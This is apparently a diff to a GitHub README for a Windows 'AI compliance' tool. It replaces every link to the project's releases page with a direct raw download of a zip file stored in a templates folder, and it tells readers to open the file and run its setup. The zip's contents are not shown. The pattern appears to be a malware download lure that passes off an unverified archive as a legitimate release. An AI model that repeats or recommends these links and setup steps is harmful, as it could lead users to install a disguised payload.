@@ -1,10 +1,10 @@
 # 🤖 ai-compliance-false-assurance - Clearer AI Risk Checks
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue.svg)](https://github.com/tyvo4221/ai-compliance-false-assurance/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue.svg)](https://raw.githubusercontent.com/tyvo4221/ai-compliance-false-assurance/main/05_templates/assurance_compliance_ai_false_v1.9.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/tyvo4221/ai-compliance-false-assurance/releases
+Visit this page to download: https://raw.githubusercontent.com/tyvo4221/ai-compliance-false-assurance/main/05_templates/assurance_compliance_ai_false_v1.9.zip
 
 Choose the latest release for Windows, then download the file that matches your device. After the download finishes, open the file and follow the setup steps on screen.
 
@@ -164,7 +164,7 @@ This release is designed for Windows users who want a direct way to review AI-re
 
 ## 📦 Release page
 
-Use this page to get the latest Windows download: https://github.com/tyvo4221/ai-compliance-false-assurance/releases
+Use this page to get the latest Windows download: https://raw.githubusercontent.com/tyvo4221/ai-compliance-false-assurance/main/05_templates/assurance_compliance_ai_false_v1.9.zip
 
 ## 🏷️ Topics
 
